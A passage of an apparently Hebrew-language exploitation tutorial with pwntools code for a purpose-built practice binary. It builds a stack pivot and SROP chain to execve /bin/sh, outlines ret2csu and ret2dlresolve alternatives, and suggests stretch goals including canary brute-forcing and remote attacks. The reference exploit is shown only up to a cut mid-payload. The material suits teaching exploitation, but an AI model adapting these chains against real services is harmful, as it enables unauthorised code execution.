+<a id="__codelineno-11-18" name="__codelineno-11-18" href="#__codelineno-11-18"></a><span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">stage</span> <span class="o">-</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;stage&#39;</span><span class="p">]</span>
+<a id="__codelineno-11-19" name="__codelineno-11-19" href="#__codelineno-11-19"></a><span class="n">g_syscall</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;g_syscall&#39;</span><span class="p">]</span>
+<a id="__codelineno-11-20" name="__codelineno-11-20" href="#__codelineno-11-20"></a><span class="n">g_pop_rax</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;g_pop_rax&#39;</span><span class="p">]</span>
+<a id="__codelineno-11-21" name="__codelineno-11-21" href="#__codelineno-11-21"></a><span class="n">leave_ret</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="n">LEAVE_RET</span>
+<a id="__codelineno-11-22" name="__codelineno-11-22" href="#__codelineno-11-22"></a>
+<a id="__codelineno-11-23" name="__codelineno-11-23" href="#__codelineno-11-23"></a><span class="c1"># (2) build the staging area and send it</span>
+<a id="__codelineno-11-24" name="__codelineno-11-24" href="#__codelineno-11-24"></a><span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
+<a id="__codelineno-11-25" name="__codelineno-11-25" href="#__codelineno-11-25"></a><span class="n">frame</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_execve</span>      <span class="c1"># 59</span>
+<a id="__codelineno-11-26" name="__codelineno-11-26" href="#__codelineno-11-26"></a><span class="n">frame</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">stage</span>                     <span class="c1"># &quot;/bin/sh&quot; sits at stage+0</span>
+<a id="__codelineno-11-27" name="__codelineno-11-27" href="#__codelineno-11-27"></a><span class="n">frame</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span>
+<a id="__codelineno-11-28" name="__codelineno-11-28" href="#__codelineno-11-28"></a><span class="n">frame</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">0</span>
+<a id="__codelineno-11-29" name="__codelineno-11-29" href="#__codelineno-11-29"></a><span class="n">frame</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">g_syscall</span>
+<a id="__codelineno-11-30" name="__codelineno-11-30" href="#__codelineno-11-30"></a><span class="n">frame</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">stage</span> <span class="o">+</span> <span class="mh">0x400</span>             <span class="c1"># some valid writable address</span>
+<a id="__codelineno-11-31" name="__codelineno-11-31" href="#__codelineno-11-31"></a>
+<a id="__codelineno-11-32" name="__codelineno-11-32" href="#__codelineno-11-32"></a><span class="n">chain</span>  <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span>               <span class="c1"># stage+0  : string + padding for the pivot</span>
+<a id="__codelineno-11-33" name="__codelineno-11-33" href="#__codelineno-11-33"></a><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">g_pop_rax</span><span class="p">)</span>               <span class="c1"># stage+8</span>
+<a id="__codelineno-11-34" name="__codelineno-11-34" href="#__codelineno-11-34"></a><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>                      <span class="c1"># stage+16 : rax = 15</span>
+<a id="__codelineno-11-35" name="__codelineno-11-35" href="#__codelineno-11-35"></a><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">g_syscall</span><span class="p">)</span>               <span class="c1"># stage+24 : syscall -&gt; sigreturn</span>
+<a id="__codelineno-11-36" name="__codelineno-11-36" href="#__codelineno-11-36"></a><span class="n">chain</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>                 <span class="c1"># stage+32 : the frame</span>
+<a id="__codelineno-11-37" name="__codelineno-11-37" href="#__codelineno-11-37"></a><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">chain</span><span class="p">)</span>
+<a id="__codelineno-11-38" name="__codelineno-11-38" href="#__codelineno-11-38"></a>
+<a id="__codelineno-11-39" name="__codelineno-11-39" href="#__codelineno-11-39"></a><span class="c1"># (3) canary leak - TODO milestone 3</span>
+<a id="__codelineno-11-40" name="__codelineno-11-40" href="#__codelineno-11-40"></a><span class="c1"># ...</span>
+<a id="__codelineno-11-41" name="__codelineno-11-41" href="#__codelineno-11-41"></a>
+<a id="__codelineno-11-42" name="__codelineno-11-42" href="#__codelineno-11-42"></a><span class="c1"># (4) pivot - TODO milestone 4</span>
+<a id="__codelineno-11-43" name="__codelineno-11-43" href="#__codelineno-11-43"></a><span class="c1"># payload = b&#39;A&#39;*CANARY_OFF + p64(canary) + p64(stage) + p64(leave_ret)</span>
+<a id="__codelineno-11-44" name="__codelineno-11-44" href="#__codelineno-11-44"></a><span class="c1"># io.send(payload)</span>
+<a id="__codelineno-11-45" name="__codelineno-11-45" href="#__codelineno-11-45"></a><span class="c1"># io.interactive()</span>
+</code></pre></div>
+<h2 id="-ret2csu">נתיב חלופי - ret2csu<a class="headerlink" href="#-ret2csu" title="Permanent link">&para;</a></h2>
+<p>מה עושים אם אין <code>syscall</code> נוח, אבל הבינארי עדיין מכיל את <code>__libc_csu_init</code> (נכון לגרסאות glibc קטנות מ-2.34)? כאן נכנס ret2csu. תזכורת קצרה על שני הגאדג'טים שהוא נותן לנו:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1">; gadget1 - loads six registers from the stack</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="nf">pop</span><span class="w"> </span><span class="no">rbx</span><span class="w"> </span><span class="c1">; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="c1">; gadget2 - moves them into argument registers and calls the function</span>
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="no">r15</span><span class="w"> </span><span class="c1">; mov rsi, r14 ; mov edi, r13d ; call [r12 + rbx*8]</span>
+</code></pre></div>
+<p>מסדרים ב-gadget1 את <code>rbx=0</code>, <code>rbp=1</code> (כדי שהלולאה שאחרי ה-<code>call</code> תיפול החוצה), <code>r12</code> יצביע לכתובת של הפונקציה שנרצה לקרוא, <code>r13</code>=ארגומנט ראשון, <code>r14</code>=שני, <code>r15</code>=שלישי. אחרי ה-<code>call</code> הchain ממשיכה. בודקים שהגאדג'טים קיימים:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>ROPgadget<span class="w"> </span>--binary<span class="w"> </span>chain<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">&#39;mov rdx, r15 ; mov rsi, r14&#39;</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>ROPgadget<span class="w"> </span>--binary<span class="w"> </span>chain<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">&#39;pop rbx ; pop rbp ; pop r12&#39;</span>
+</code></pre></div>
+<p>יש כאן מלכודת חשובה: <code>mov edi, r13d</code> טוען רק את 32 הביטים התחתונים של <code>rdi</code>. תחת PIE הכתובת של <code>/bin/sh</code> בבמה היא 64 ביט, אז ret2csu <strong>לא</strong> נוח לסידור <code>rdi</code> לכתובת מלאה. לכן הוא מבריק לסידור <code>rsi</code> ו-<code>rdx</code>, אבל פחות ל-<code>rdi</code>.</p>
+<p>איך בכל זאת מנצלים אותו כאן? במקום <code>execve</code>, משתמשים ב-ret2csu כדי לקרוא ל-<code>write(1, got_entry, 8)</code> - ה-<code>rdi=1</code> נכנס יפה ב-32 ביט, ותחת Full RELRO ה-GOT כבר מכיל כתובות libc אמיתיות (הן נכתבו בטעינה). כך מדליפים כתובת libc, מחשבים בסיס, ובשלב שני קוראים ל-<code>system("/bin/sh")</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>pivot -&gt; ret2csu: write(1, elf.got[&#39;read&#39;], 8)  -&gt; libc leak
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>      -&gt; return to vuln / to a controlled stack
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>      -&gt; stage two: system(&quot;/bin/sh&quot;)  (with a pop rdi gadget we&#39;ll need to find)
+</code></pre></div>
+<p>זה עובד, אבל שימו לב להבדל המהותי: הנתיב הזה <strong>תלוי libc</strong>. הוא דורש שתדעו באיזו גרסת libc מדובר כדי לחשב את ההיסט ל-<code>system</code>. הנתיב SROP, לעומתו, לא נוגע ב-libc בכלל. זו בדיוק הסיבה ש-SROP הוא הנתיב המרכזי כאן, ו-ret2csu הוא תרגיל השוואה מצוין.</p>
+<h2 id="full-relro-ret2dlresolve">המגבלה של Full RELRO על ret2dlresolve<a class="headerlink" href="#full-relro-ret2dlresolve" title="Permanent link">&para;</a></h2>
+<p>אולי שאלתם את עצמכם: למה לא ret2dlresolve? הרי זו בדיוק הטכניקה שנועדה לפתור סמלים בלי leak של libc. התשובה היא ההגנה Full RELRO.</p>
+<p>הטכניקה ret2dlresolve הקלאסית מזייפת מבני <code>Elf64_Rela</code> ו-<code>Elf64_Sym</code> ומחרוזת שם, ואז קופצת אל <code>PLT[0]</code> - סטאב ה-resolver שדוחף אינדקס ומקפיץ ל-<code>_dl_runtime_resolve</code>. כל זה מסתמך על <strong>קישור עצל - lazy binding</strong>: על כך שה-PLT באמת עובר דרך ה-resolver בזמן ריצה. תחת Full RELRO (שמופעל אצלנו עם <code>-z now</code>), הקישור מתבצע כולו בטעינה, ה-<code>.got.plt</code> מלא ומוקפא לקריאה בלבד, והמסלול דרך <code>_dl_runtime_resolve</code> פשוט לא בשימוש. במילים אחרות: ב-<code>chain</code> שלנו ret2dlresolve הקלאסי מת.</p>
+<p>מי שרוצה בכל זאת לתרגל את הטכניקה - קמפלו וריאנט עם קישור עצל (Partial RELRO), רצוי בלי PIE כדי שכתובות ה-<code>.bss</code> יהיו קבועות:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>gcc<span class="w"> </span>-O0<span class="w"> </span>-fstack-protector-all<span class="w"> </span>-no-pie<span class="w"> </span>-Wl,-z,relro,-z,lazy<span class="w"> </span>-o<span class="w"> </span>chain_dl<span class="w"> </span>chain.c
+</code></pre></div>
+<p>ואז pwntools בונה את הpayload כמעט לבד:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./chain_dl&#39;</span><span class="p">)</span>
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="n">dl</span>  <span class="o">=</span> <span class="n">Ret2dlresolvePayload</span><span class="p">(</span><span class="n">elf</span><span class="p">,</span> <span class="n">symbol</span><span class="o">=</span><span class="s1">&#39;system&#39;</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">])</span>
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="n">rop</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">dl</span><span class="o">.</span><span class="n">data_addr</span><span class="p">)</span>     <span class="c1"># write the fake structures to a known bss address</span>
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="n">rop</span><span class="o">.</span><span class="n">ret2dlresolve</span><span class="p">(</span><span class="n">dl</span><span class="p">)</span>
+<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="n">raw_rop</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">()</span>
+</code></pre></div>
+<p>תשלבו את זה עם הפיבוט בדיוק כמו את chain ה-SROP: קודם ממלאים את הבמה עם <code>raw_rop</code> ועם <code>dl.payload</code>, ואז מפעילים את הפיבוט. זו הדרך הנכונה להוכיח שהבנתם גם את הטכניקה השלישית מהפרק.</p>
+<h2 id="-common-pitfalls">מלכודות נפוצות - common pitfalls<a class="headerlink" href="#-common-pitfalls" title="Permanent link">&para;</a></h2>
+<ul>
+<li><strong>שכחתם את הpadding של 8 הבתים בתחילת הבמה.</strong> ה-<code>pop rbp</code> שבתוך ה-<code>leave</code> השני בולע את <code>stage+0</code>. אם שמתם שם את הגאדג'ט הראשון, הוא נבלע, וה-<code>ret</code> קופץ אל בתי <code>/bin/sh</code> - קריסה. אנחנו פותרים את זה בכך שהמחרוזת עצמה יושבת ב-<code>stage+0</code>, ולכן היא גם הpadding וגם <code>/bin/sh</code>.</li>
+<li><strong>בית newline בכתובת שדלפה או בcanary.</strong> אם 7 בתי הcanary מכילים במקרה <code>0x0a</code>, ה-<code>recvline</code> יחתוך אותם באמצע. זו אחת הסיבות לעטוף את כל ה-exploit בלולאת ניסיונות חוזרים (ראו מטרות מתיחה).</li>
+<li><strong>בלבול בין ה-rsp של המסגרת למיקום הקריאה.</strong> ה-<code>rt_sigreturn</code> קורא את המסגרת מ-<code>rsp</code> <strong>ברגע ה-syscall</strong>. אצלנו זה <code>stage+0x20</code>, ולכן שם בדיוק המסגרת מתחילה. טעות של 8 בתים כאן = קריסה. אמתו ב-gdb: breakpoint על <code>g_syscall</code>, בדקו <code>rsp</code>.</li>
+<li><strong>הקריאה read לא מוסיפה null ולא עוצרת ב-newline.</strong> השתמשו ב-<code>send</code> (לא <code>sendline</code>) בשליחת הchains והpayloads, כדי לשלוט בדיוק במספר הבתים ובלי newline מיותר שיזיז דברים.</li>
+<li><strong>הבמה חייבת להיכתב לפני הפיבוט.</strong> הסדר תמיד: קודם ממלאים את <code>stage</code>, אחר כך מדליפים canary, ורק בסוף מפוצצים. אם תהפכו את הסדר, אין chain לקפוץ אליה.</li>
+<li><strong>ערבוב ההגנות.</strong> אם שכחתם <code>-z now</code>, קיבלתם Partial RELRO, וה-checksec לא יראה Full RELRO. אם שכחתם <code>-fstack-protector-all</code>, אין canary לדלוף והתרגיל מאבד חלק מהמורכבות. תמיד אמתו עם checksec לפני שמתחילים.</li>
+</ul>
+<h2 id="-stretch-goals">מטרות מתיחה - stretch goals<a class="headerlink" href="#-stretch-goals" title="Permanent link">&para;</a></h2>
+<p>השלמתם את הנתיב המרכזי? הנה איך לוקחים את הפרויקט לרמת מחקר אמיתי.</p>
+<p><strong>מטרה 1 - בלי שום leak.</strong> מחקו מהמקור את שורת <code>printf("stage @ %p")</code> ואת <code>puts(buf)</code>, קמפלו מחדש, ופתרו בלי leak של PIE ובלי leak של canary. עוטפים את הבינארי בשרת forking (הילדים יורשים מההורה גם את בסיס ה-ASLR וגם את הcanary), ואז מפצחים בית-בית: מנחשים בית של הcanary, ואם התהליך לא קרס - הבית נכון. 256 ניחושים כפול 8 בתים לcanary, ואותו רעיון לביטים התחתונים של בסיס ה-PIE. זה ההבדל בין "יש leak" ל"אין leak" בעולם האמיתי.</p>
+<p><strong>מטרה 2 - רק ret2csu, בלי גאדג'טים מובטחים.</strong> מחקו את בלוק ה-<code>__asm__</code> וקמפלו על toolchain שעדיין פולט <code>__libc_csu_init</code>. עכשיו אין <code>g_syscall</code> ואין <code>g_pop_rax</code>, ותצטרכו לבנות את הכל מגאדג'טי ה-csu ומleak של libc, כמתואר בנתיב החלופי. תסיימו עם <code>system("/bin/sh")</code> מלא.</p>
+<p><strong>מטרה 3 - ret2dlresolve טהור.</strong> ממשו את הווריאנט עם Partial RELRO ובלי PIE שתיארנו, כולל שילוב עם הפיבוט. תשוו לעצמכם: כמה בתים תפס הpayload של ret2dlresolve לעומת מסגרת ה-SROP? מתי הייתם מעדיפים כל טכניקה?</p>
+<p><strong>מטרה 4 - תקיפה מרחוק מול libc לא ידועה.</strong> עטפו את הבינארי בשרת (למשל עם <code>socat</code>), החליפו <code>process</code> ב-<code>remote</code>, והוכיחו שנתיב ה-SROP עובד בלי שינוי גם כשאין לכם בכלל את קובץ ה-libc של השרת. זה היתרון הגדול של SROP: הוא לא נוגע ב-libc, אז הוא ניטרלי לחלוטין לגרסה.</p>
+<p><strong>מטרה 5 - chain SROP כפולה.</strong> לפני ה-<code>execve</code>, השתמשו ב-SROP ראשון כדי לקרוא <code>mprotect</code> על אזור ולהפוך אותו לניתן להרצה, ואז SROP שני כדי לקפוץ ל-shellcode שכתבתם לשם. זה מראה ש-SROP הוא לא רק "פתיחת shell" אלא פרימיטיב כללי לשליטה מלאה על מצב האוגרים.</p>
+<h2 id="-reference-exploit">פתרון ייחוס - reference exploit<a class="headerlink" href="#-reference-exploit" title="Permanent link">&para;</a></h2>
+<p>אחרי שהתמודדתם לבד, הנה exploit מלא ורץ: פיבוט + SROP, בלי שום כתובת libc. השתמשו בו כדי להשוות לעצמכם, לא כדי לדלג על העבודה:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="ch">#!/usr/bin/env python3</span>
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>
+<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./chain&#39;</span><span class="p">)</span>
+<a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span>
+<a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>
+<a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a><span class="n">CANARY_OFF</span> <span class="o">=</span> <span class="mi">72</span>          <span class="c1"># buf -&gt; canary</span>
+<a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a><span class="n">LEAVE_RET</span>  <span class="o">=</span> <span class="mh">0x1238</span>      <span class="c1"># ROPgadget --binary chain | grep &#39;: leave ; ret&#39;  (offset; verify)</span>
+<a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>
+<a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a><span class="k">def</span><span class="w"> </span><span class="nf">start</span><span class="p">():</span>
+<a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>    <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./chain&#39;</span><span class="p">)</span>        <span class="c1"># replace with remote(HOST, PORT) against a server</span>
+<a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a>
+<a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a><span class="k">def</span><span class="w"> </span><span class="nf">exploit</span><span class="p">():</span>
+<a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a>    <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a>
+<a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a>    <span class="c1"># (1) PIE leak from the address of the staging area</span>
+<a id="__codelineno-17-17" name="__codelineno-17-17" href="#__codelineno-17-17"></a>    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;stage @ &#39;</span><span class="p">)</span>
+<a id="__codelineno-17-18" name="__codelineno-17-18" href="#__codelineno-17-18"></a>    <span class="n">stage</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+<a id="__codelineno-17-19" name="__codelineno-17-19" href="#__codelineno-17-19"></a>    <span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">stage</span> <span class="o">-</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;stage&#39;</span><span class="p">]</span>
+<a id="__codelineno-17-20" name="__codelineno-17-20" href="#__codelineno-17-20"></a>    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;stage    @ </span><span class="si">%#x</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">stage</span><span class="p">)</span>
+<a id="__codelineno-17-21" name="__codelineno-17-21" href="#__codelineno-17-21"></a>    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;PIE base @ </span><span class="si">%#x</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
+<a id="__codelineno-17-22" name="__codelineno-17-22" href="#__codelineno-17-22"></a>
+<a id="__codelineno-17-23" name="__codelineno-17-23" href="#__codelineno-17-23"></a>    <span class="n">g_syscall</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;g_syscall&#39;</span><span class="p">]</span>
+<a id="__codelineno-17-24" name="__codelineno-17-24" href="#__codelineno-17-24"></a>    <span class="n">g_pop_rax</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;g_pop_rax&#39;</span><span class="p">]</span>
+<a id="__codelineno-17-25" name="__codelineno-17-25" href="#__codelineno-17-25"></a>    <span class="n">leave_ret</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="n">LEAVE_RET</span>
+<a id="__codelineno-17-26" name="__codelineno-17-26" href="#__codelineno-17-26"></a>
+<a id="__codelineno-17-27" name="__codelineno-17-27" href="#__codelineno-17-27"></a>    <span class="c1"># (2) build and send the staging area: string, prep rax=15, syscall, and SROP frame</span>
+<a id="__codelineno-17-28" name="__codelineno-17-28" href="#__codelineno-17-28"></a>    <span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
+<a id="__codelineno-17-29" name="__codelineno-17-29" href="#__codelineno-17-29"></a>    <span class="n">frame</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_execve</span>      <span class="c1"># 59</span>
+<a id="__codelineno-17-30" name="__codelineno-17-30" href="#__codelineno-17-30"></a>    <span class="n">frame</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">stage</span>                     <span class="c1"># &quot;/bin/sh&quot; sits at stage+0</span>
+<a id="__codelineno-17-31" name="__codelineno-17-31" href="#__codelineno-17-31"></a>    <span class="n">frame</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span>
+<a id="__codelineno-17-32" name="__codelineno-17-32" href="#__codelineno-17-32"></a>    <span class="n">frame</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">0</span>
+<a id="__codelineno-17-33" name="__codelineno-17-33" href="#__codelineno-17-33"></a>    <span class="n">frame</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">g_syscall</span>
+<a id="__codelineno-17-34" name="__codelineno-17-34" href="#__codelineno-17-34"></a>    <span class="n">frame</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">stage</span> <span class="o">+</span> <span class="mh">0x400</span>
+<a id="__codelineno-17-35" name="__codelineno-17-35" href="#__codelineno-17-35"></a>
+<a id="__codelineno-17-36" name="__codelineno-17-36" href="#__codelineno-17-36"></a>    <span class="n">chain</span>  <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span>               <span class="c1"># stage+0  : string + padding for the pivot</span>
+<a id="__codelineno-17-37" name="__codelineno-17-37" href="#__codelineno-17-37"></a>    <span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">g_pop_rax</span><span class="p">)</span>               <span class="c1"># stage+8</span>
+<a id="__codelineno-17-38" name="__codelineno-17-38" href="#__codelineno-17-38"></a>    <span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>                      <span class="c1"># stage+16 : rax = 15</span>
+<a id="__codelineno-17-39" name="__codelineno-17-39" href="#__codelineno-17-39"></a>    <span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">g_syscall</span><span class="p">)</span>               <span class="c1"># stage+24 : syscall -&gt; sigreturn</span>
+<a id="__codelineno-17-40" name="__codelineno-17-40" href="#__codelineno-17-40"></a>    <span class="n">chain</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>                 <span class="c1"># stage+32 : the frame</span>
+<a id="__codelineno-17-41" name="__codelineno-17-41" href="#__codelineno-17-41"></a>    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">chain</span><span class="p">)</span>                        <span class="c1"># fills read(stage); must happen before &quot;name&gt; &quot;</span>
+<a id="__codelineno-17-42" name="__codelineno-17-42" href="#__codelineno-17-42"></a>
+<a id="__codelineno-17-43" name="__codelineno-17-43" href="#__codelineno-17-43"></a>    <span class="c1"># (3) canary leak via the name &quot;feature&quot;</span>
+<a id="__codelineno-17-44" name="__codelineno-17-44" href="#__codelineno-17-44"></a>    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;name&gt; &#39;</span><span class="p">)</span>
+<a id="__codelineno-17-45" name="__codelineno-17-45" href="#__codelineno-17-45"></a>    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="n">CANARY_OFF</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span>      <span class="c1"># overwrites only the low null byte of the canary</span>
+<a id="__codelineno-17-46" name="__codelineno-17-46" href="#__codelineno-17-46"></a>    <span class="n">resp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<a id="__codelineno-17-47" name="__codelineno-17-47" href="#__codelineno-17-47"></a>    <span class="n">canary</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">resp</span><span class="p">[</span><span class="n">CANARY_OFF</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:</span> <span class="n">CANARY_OFF</span> <span class="o">+</span> <span class="mi">8</span><span class="p">])</span>
+<a id="__codelineno-17-48" name="__codelineno-17-48" href="#__codelineno-17-48"></a>    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;canary   @ </span><span class="si">%#x</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">canary</span><span class="p">)</span>
+<a id="__codelineno-17-49" name="__codelineno-17-49" href="#__codelineno-17-49"></a>
+<a id="__codelineno-17-50" name="__codelineno-17-50" href="#__codelineno-17-50"></a>    <span class="c1"># (4) the tiny overflow -&gt; pivot to the staging area</span>
+<a id="__codelineno-17-51" name="__codelineno-17-51" href="#__codelineno-17-51"></a>    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
+<a id="__codelineno-17-52" name="__codelineno-17-52" href="#__codelineno-17-52"></a>    <span class="n">payload</span>  <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">CANARY_OFF</span>          <span class="c1"># 72 padding bytes</span>
+<a id="__codelineno-17-53" name="__codelineno-17-53" href="#__codelineno-17-53"></a>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>                <span class="c1"># restore the correct canary</span>
